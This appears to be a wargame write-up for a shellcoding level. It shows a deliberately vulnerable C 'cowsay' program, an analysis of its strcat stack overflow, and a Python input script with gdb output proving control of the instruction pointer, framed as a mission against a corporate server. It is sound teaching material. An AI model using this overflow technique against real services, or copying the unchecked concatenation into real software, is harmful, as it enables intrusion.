# Shellcoding - Level 1

## Mission (Cowsay Corruption)

We've been probing a corporate network for weeks looking for a way in, but they're locked down pretty good. Fortunately, one of our networking guys found a server that seems to have a vulnerable version of `cowsay` bound to a port.

We've obtained an identical version of the binary. Can you write us an exploit for it?


## Source Code

```c
// gcc -g -I ../includes -z execstack -fno-stack-protector -no-pie -o 04_level_1 04_level_1.c
#include <stdio.h>
#include <string.h>

// Hidden for simplicity
#include "wargames.h"

void cowsay(const char * text)
{
    // Print top of speech bubble
    printf("    ");
    for (int i = 0; i < strlen(text) + 2; i++)
        printf("-");
    printf("\n");

    // Print speech text
    printf("   < %s >\n", text);

    // Print bottom of speech bubble
    printf("    ");
    for (int i = 0; i < strlen(text) + 2; i++)
        printf("-");
    printf("\n");

    // Print an ASCII cow
    printf("           \\   ^__^             \n");
    printf("            \\  (oo)\\_______     \n");
    printf("               (__)\\       )\\/\\ \n");
    printf("                   ||----w |    \n");
    printf("                   ||     ||     \n");
    printf("        .--+--o--------+------\\+/-----.\n");
}

void main()
{
    init_wargame();

    printf("------------------------------------------------------------\n");
    printf("--[ Shellcode Level #1 - Cowsay                             \n");
    printf("------------------------------------------------------------\n");

    // Buffer to hold user input & final cowsay text
    char text[128] = {};
    char buffer[128] = {};

    // Prompt the user for some cow-friendly text
    printf("Enter a string to cowsay: ");
    fgets(buffer, sizeof(buffer), stdin);
    buffer[strcspn(buffer, "\n")] = 0;

    // Build the final cowsay message, with some added mooing
    strcat(text, "mo00oooo00o0o... ");
    strcat(text, buffer);

    // Clear the original user input buffer off the stack
    memset(buffer, 0, sizeof(buffer));

    // Print the ASCII cow with the user text
    cowsay(text);

    // Exit the program / return from main
}

```


## Static Analysis

Reviewing the code we can see there is two functions. The first function `cowsay` is just used to print out the ascii text, speech bubble and some text (poiner to char array) that is supplied to the function as an argument. 


The main function is where all of the logic happens. 
- At first, the user is prompted to enter a string to cowsay 
- Next, the string that the user entered is concatonated with the text for the cowsay message.
- Finally, the ascii text, with the additional cowsay message and user added string is printed to the terminal. 


Within this function there's two char arrays (buffers), `text` and `buffer`, which are both initialised to 0 and 128 bytes in size. When the user enters a string, this will go to the `buffer` array with the new line stripped. The `text` array has the string `"mo00oooo00o0o... "` concatinated to it intially, which takes up 17 bytes out of the 128 bytes allocation, leaving 111 bytes remaining. The string entered by the user `buffer` is also concatonated to the `text` array.


The interesting thing to note here is that the user supplied string is orignally received from the `fgets` function with a size of 128 bytes and then stored in a 128 byte array. The string in this array is then concatonated to the `text` array which also has a size of 128 bytes, however this does not account for the 17 bytes already taken up in the `text` array or any check on the size of the user string being copied. As a result, there is an overflow in the array if the use supplied a string over 111 bytes. 


## Dynamic Analysis

To test the theory, first we enter a short string "Howdy ya'll!":

```gdb
------------------------------------------------------------
--[ Shellcode Level #1 - Cowsay
------------------------------------------------------------
Enter a string to cowsay:
>> Howdy Ya'll!
    -------------------------------
   < mo00oooo00o0o... Howdy Ya'll! >
    -------------------------------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||
        .--+--o--------+------\+/-----.
==== EXECUTION FINISHED ====
```

As we can see, our text is print the terminal screen in the message. 


Next, We'll create a python script to send 111 A's plus an additional 8 B's and 8 C's:


```python
import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
data = p.readuntil('Enter a string to cowsay: ')
p.sendline('A' * 111 + 'B' * 8 + 'C' * 8)

p.interactive()
```

```gdb
$ python3 exploit.py
    -------------------------------------------------------------------------------------
-------------------------------------------------------------
   < mo00oooo00o0o... AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC >
    -------------------------------------------------------------------------------------
-------------------------------------------------------------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||
        .--+--o--------+------\+/-----.
```

As expected, this input causes a segmentation fault:

```gdb
rax: 0x0000000000000028
rbx: 0x0000000000000000
rcx: 0x00000000fbad2887
rdx: 0x00007f00005ee780
rsi: 0x00007f00005ed6a3
rdi: 0x0000000000000001
rbp: 0x4242424242424242
rsp: 0x00007fffffffede0
rip: 0x4343434343434343
r8:  0x00007f0000026e40
r9:  0x00007f0000026e40
r10: 0x0000000000000090
r11: 0x00007fffffffed50
r12: 0x00000000004007d0
r13: 0x00007fffffffeeb0
r14: 0x0000000000000000
r15: 0x0000000000000000
fs:  0x0000000000000000
gs:  0x0000000000000000
eflags: 0x0000000000000004
```
Looking at the `rbp` register, we can see that the 8 B's in our input has cleanly overwritten the register. Reviewing the `rip` register, we can see the additional 8 C's we sent has overwritten the register also, giving us control over the execution flow.


